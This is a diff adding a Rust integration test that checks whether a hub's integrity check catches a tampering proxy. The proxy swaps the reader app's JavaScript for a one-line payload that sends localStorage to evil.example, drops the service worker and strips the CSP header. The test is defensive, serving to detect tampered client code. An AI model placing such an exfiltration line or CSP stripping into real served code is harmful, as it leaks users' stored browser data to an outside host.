@@ -1100,3 +1100,60 @@ async fn the_hub_reading_view_has_what_reader_js_needs() {
         assert!(hub_page.contains(needle), "the hub's page: {needle}");
     }
 }
+
+#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
+async fn hub_check_finds_a_reader_app_that_differs() {
+    use shelfgauge::hub::check::check;
+    use shelfgauge::hub_client::HubUrl;
+
+    let hub = TestHub::start_with(|c| c.server.base_path = "/sg".into()).await;
+    let url = HubUrl::parse(&format!("{}/sg", hub.url)).unwrap();
+    let report = tokio::task::spawn_blocking(move || check(&url))
+        .await
+        .unwrap()
+        .unwrap();
+    assert!(report.matches(), "{report:?}");
+    assert!(report.same_version());
+    assert!(report.checked > 10, "{report:?}");
+
+    // The same hub behind a proxy that changes the app and drops the worker.
+    async fn tamper(
+        req: axum::extract::Request,
+        next: axum::middleware::Next,
+    ) -> axum::response::Response {
+        use axum::response::IntoResponse;
+        match req.uri().path() {
+            "/assets/hub.js" => "fetch('https://evil.example/' + localStorage)".into_response(),
+            "/sw.js" => StatusCode::NOT_FOUND.into_response(),
+            _ => {
+                let mut response = next.run(req).await;
+                response.headers_mut().remove("content-security-policy");
+                response
+            }
+        }
+    }
+    let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
+    let port = listener.local_addr().unwrap().port();
+    let mut config = shelfgauge::hub::config::HubConfig::default();
+    config.server.port = port;
+    let state = shelfgauge::hub::HubState::new(
+        shelfgauge::hub::Hub::with_config(hub._dir.path(), config).unwrap(),
+    );
+    let app = shelfgauge::hub::router(state).layer(axum::middleware::from_fn(tamper));
+    tokio::spawn(async move {
+        axum::serve(
+            listener,
+            app.into_make_service_with_connect_info::<std::net::SocketAddr>(),
+        )
+        .await
+    });
+    let url = HubUrl::parse(&format!("http://localhost:{port}")).unwrap();
+    let report = tokio::task::spawn_blocking(move || check(&url))
+        .await
+        .unwrap()
+        .unwrap();
+    assert!(!report.matches());
+    assert_eq!(report.differing, ["/assets/hub.js"]);
+    assert_eq!(report.missing, [("/sw.js".to_owned(), 404)]);
+    assert!(!report.csp_matches);
+}
